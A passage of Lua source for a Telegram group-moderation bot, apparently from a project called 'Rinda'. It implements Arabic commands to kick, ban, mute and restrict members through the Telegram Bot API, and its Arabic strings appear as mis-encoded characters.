getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ValidityReply)
end end
if text and (text:match('^ุตูุงุญูุชู @(.*)') or text:match('^ุตูุงุญูุงุชู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุตูุงุญูุชู @(.*)') or text:match('^ุตูุงุญูุงุชู @(.*)')
function ValidityUser(extra,result,success)
if result.id_ then
Validity(msg,result.id_) 
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,ValidityUser)
end
if text and (text:match('^ุตูุงุญูุชู (%d+)') or text:match('^ุตูุงุญูุงุชู (%d+)')) and ChCheck(msg) then
local ValidityId = text:match('ุตูุงุญูุชู (%d+)') or text:match('ุตูุงุญูุงุชู (%d+)')
Validity(msg,ValidityId)  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if Admin(msg) then
if msg.reply_to_message_id_ ~= 0 then
if text and (text:match("^ูุณุญ$") or text:match("^ุญุฐู$") or text:match("^โข ุงุฎูุงุก ุงูููุจูุฑุฏ โ$")) and ChCheck(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.reply_to_message_id_})
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if RioConstructor(msg) then
if text == "ุชูุนูู ุงูุญุธุฑ" and ChCheck(msg) or text == "ุชูุนูู ุงูุทุฑุฏ" and ChCheck(msg) then
DevRio:del(Rinda.."Rio:Lock:KickBan"..msg.chat_id_)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงูุทุฑุฏ ูุงูุญุธุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
if text == "ุชุนุทูู ุงูุญุธุฑ" and ChCheck(msg) or text == "ุชุนุทูู ุงูุทุฑุฏ" and ChCheck(msg) then
DevRio:set(Rinda.."Rio:Lock:KickBan"..msg.chat_id_,"true")
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
if text == "ุชูุนูู ุงููุชู" and ChCheck(msg) or text == "ุชูุนูู ุงูุชูููุฏ" and ChCheck(msg) then
DevRio:del(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_)
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชูุนู ุงููุชู ูุงูุชููุฏ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
if text == "ุชุนุทูู ุงููุชู" and ChCheck(msg) or text == "ุชุนุทูู ุงูุชูููุฏ" and ChCheck(msg) then
DevRio:set(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_,"true")
local RindaTeam = 'โ๏ธฐูููู ุจเขชู โข '..RioRank(msg)..' \nโ๏ธฐุชุนุทู ุงููุชู ูุงูุชููุฏ'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, RindaTeam, 14, string.len(msg.sender_user_id_))
end
end
if RioConstructor(msg) then
if text == "ุชูุนูู ุงูุฑูุน" and ChCheck(msg) or text == "ุชูุนูู ุงูุชุฑููู" and ChCheck(msg) then
DevRio:del(Rinda.."Rio:Lock:ProSet"..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชูุนู ุฑูุน โข ุงูููุดุฆ ุงูุงุณุงุณู โข ุงูููุดุฆ โข ุงููุฏูุฑ โข ุงูุงุฏูู โข ุงููููุฒ', 1, 'md')
end
if text == "ุชุนุทูู ุงูุฑูุน" and ChCheck(msg) or text == "ุชุนุทูู ุงูุชุฑููู" and ChCheck(msg) then
DevRio:set(Rinda.."Rio:Lock:ProSet"..msg.chat_id_,"true")
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุชุนุทู ุฑูุน โข ุงูููุดุฆ ุงูุงุณุงุณู โข ุงูููุดุฆ โข ุงููุฏูุฑ โข ุงูุงุฏูู โข ุงููููุฒ', 1, 'md')
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--          Kick          --
if Admin(msg) then
if text ==('ุทุฑุฏ') and ChCheck(msg) then
function KickReply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ูุงูู ุงููุฌููุนู')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุทุฑุฏ โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธฐูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
text = "โ๏ธฐุชู ุทุฑุฏู ูู ุงููุฌููุนู" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก ุญุธุฑ โข",callback_data=msg.sender_user_id_..":UnBan:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KickReply)
end end
if text and text:match('^ุทุฑุฏ @(.*)') and ChCheck(msg) then
local username = text:match('^ุทุฑุฏ @(.*)')
function KickUser(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ูุงูู ุงููุฌููุนู')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุทุฑุฏ โข '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธฐูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุทุฑุฏู ูู ุงููุฌููุนู")  
end,nil)
end
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^ุทุฑุฏ (%d+)') and ChCheck(msg) then
local user = text:match('ุทุฑุฏ (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ูุงูู ุงููุฌููุนู')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุทุฑุฏ โข '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธฐูุง ุงุณุชุทูุน ุทุฑุฏ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุทุฑุฏู ูู ุงููุฌููุนู")  
end,nil)
end
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--          Ban           --
if Admin(msg) then
if text ==('ุญุถุฑ') or text ==('ุญุธุฑ') and ChCheck(msg) then
function BanReply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ูุงูู ุงููุฌููุนู')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุญุธุฑ โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธฐูุง ุงุณุชุทูุน ุญุธุฑ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(Rinda..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
text = "โ๏ธฐุชู ุญุธุฑู ูู ุงููุฌููุนู" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก ุญุธุฑ โข",callback_data=msg.sender_user_id_..":UnBan:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^ุญุถุฑ @(.*)') or text:match('^ุญุธุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุถุฑ @(.*)') or text:match('^ุญุธุฑ @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevRio:get(Rinda.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ูุงูู ุงููุฌููุนู')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุญุธุฑ โข '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธฐูุง ุงุณุชุทูุน ุญุธุฑ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(Rinda..'Rio:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุญุธุฑู ูู ุงููุฌููุนู")  
end,nil) 
end
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^ุญุถุฑ (%d+)') or text:match('^ุญุธุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุถุฑ (%d+)') or text:match('ุญุธุฑ (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงูุทุฑุฏ ูุงูุญุธุฑ ูู ูุจู ูุงูู ุงููุฌููุนู')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุญุธุฑ โข '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"โ๏ธฐููุณ ูุฏู ุตูุงุญูุฉ ุญุธุฑ ุงููุณุชุฎุฏููู ูุฑุฌู ุชูุนูููุง !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"โ๏ธฐูุง ุงุณุชุทูุน ุญุธุฑ ูุดุฑููู ุงููุฌููุนู") 
return false  
end
ChatKick(msg.chat_id_, user)
DevRio:sadd(Rinda..'Rio:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุญุธุฑู ูู ุงููุฌููุนู")  
end,nil) 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         UnBan          --
if text ==('ุงูุบุงุก ุงูุญุธุฑ') or text ==('ุงูุบุงุก ุญุธุฑ') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุงูุบุงุก ุญุธุฑู ูู ุงููุฌููุนู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^ุงูุบุงุก ุงูุญุธุฑ @(.*)') or text:match('^ุงูุบุงุก ุญุธุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุงูุญุธุฑ @(.*)') or text:match('^ุงูุบุงุก ุญุธุฑ @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุงูุบุงุก ุญุธุฑู ูู ุงููุฌููุนู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^ุงูุบุงุก ุงูุญุธุฑ (%d+)') or text:match('^ุงูุบุงุก ุญุธุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุงูุญุธุฑ (%d+)') or text:match('ุงูุบุงุก ุญุธุฑ (%d+)')
DevRio:srem(Rinda..'Rio:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุงูุบุงุก ุญุธุฑู ูู ุงููุฌููุนู")  
end 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--          Mute          --
if Admin(msg) then
if text ==('ูุชู') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงููุชู ูุงูุชููุฏ')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ูุชู โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
DevRio:sadd(Rinda..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
text = "โ๏ธฐุชู ูุชูู ูู ุงููุฌููุนู" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก ูุชู โข",callback_data=msg.sender_user_id_..":UnMute:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^ูุชู @(.*)') and ChCheck(msg) then
local username = text:match('^ูุชู @(.*)')
function MuteUser(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงููุชู ูุงูุชููุฏ')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ูุชู โข '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
DevRio:sadd(Rinda..'Rio:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ูุชูู ูู ุงููุฌููุนู")  
end
end
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^ูุชู (%d+)') and ChCheck(msg) then
local user = text:match('ูุชู (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงููุชู ูุงูุชููุฏ')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ูุชู โข '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","โ๏ธฐูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
DevRio:sadd(Rinda..'Rio:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ูุชูู ูู ุงููุฌููุนู")  
end
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         UnMute         --
if text ==('ุงูุบุงุก ุงููุชู') or text ==('ุงูุบุงุก ูุชู') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐูู ููุณ ููุชูู ูุงูุบุงุก ูุชูู")  
else
DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุงูุบุงุก ูุชูู ูู ุงููุฌููุนู")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^ุงูุบุงุก ุงููุชู @(.*)') or text:match('^ุงูุบุงุก ูุชู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงูุบุงุก ุงููุชู @(.*)') or text:match('^ุงูุบุงุก ูุชู @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐูู ููุณ ููุชูู ูุงูุบุงุก ูุชูู")  
else
DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุงูุบุงุก ูุชูู ูู ุงููุฌููุนู")  
end
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^ุงูุบุงุก ุงููุชู (%d+)') or text:match('^ุงูุบุงุก ูุชู (%d+)')) and ChCheck(msg) then
local user = text:match('ุงูุบุงุก ุงููุชู (%d+)') or text:match('ุงูุบุงุก ูุชู (%d+)')
if not DevRio:sismember(Rinda..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","โ๏ธฐูู ููุณ ููุชูู ูุงูุบุงุก ูุชูู")  
else
DevRio:srem(Rinda..'Rio:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุงูุบุงุก ูุชูู ูู ุงููุฌููุนู")  
end
end 
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--          Tkeed           --
if Admin(msg) then
if text ==('ุชูููุฏ') or text ==('ุชููุฏ') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงููุชู ูุงูุชููุฏ')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
text = "โ๏ธฐุชู ุชููุฏู ูู ุงููุฌููุนู" 
keyboard = {} 
keyboard.inline_keyboard = {{{text="โข ุงูุบุงุก ุชููุฏ โข",callback_data=msg.sender_user_id_..":UnTkeed:"..result.sender_user_id_}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^ุชูููุฏ @(.*)') or text:match('^ุชููุฏ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุชูููุฏ @(.*)') or text:match('^ุชููุฏ @(.*)')
function TkeedUser(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงููุชู ูุงูุชููุฏ')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชููุฏู ูู ุงููุฌููุนู")  
end
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^ุชูููุฏ (%d+)') or text:match('^ุชููุฏ (%d+)')) and ChCheck(msg) then
local user = text:match('ุชูููุฏ (%d+)') or text:match('ุชููุฏ (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'โ๏ธฐููุฏ ุชุนุทู ุงููุชู ูุงูุชููุฏ')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevRio:sadd(Rinda..'Rio:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชููุฏู ูู ุงููุฌููุนู")  
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--         UnTkeed          --
if text ==('ุงูุบุงุก ุชูููุฏ') or text ==('ุงูุบุงุก ุชููุฏ') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Rinda..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุงูุบุงุก ุชููุฏู ูู ุงููุฌููุนู")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
